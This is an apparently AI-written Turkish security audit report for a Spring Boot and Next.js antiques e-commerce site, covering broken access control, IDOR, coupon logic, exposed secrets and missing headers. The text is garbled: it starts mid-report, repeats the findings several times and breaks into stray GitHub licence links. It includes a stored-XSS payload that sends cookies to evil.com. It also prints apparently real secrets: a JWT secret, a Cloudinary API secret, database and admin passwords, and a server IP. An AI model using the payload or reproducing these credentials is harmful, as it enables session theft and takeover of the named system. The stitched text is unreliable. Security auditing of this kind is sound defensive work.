**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        
```


## License: unknown
https://github.com/hans2103/HKweb/blob/d7d731a35e32743672844f2f2870966ab936e4ca/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        ],
    }];
}
```


## License: unknown
https://github.com/praveenjuge/praveenjuge/blob/f7c607592efe59257f18e3337868dd9519bec159/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
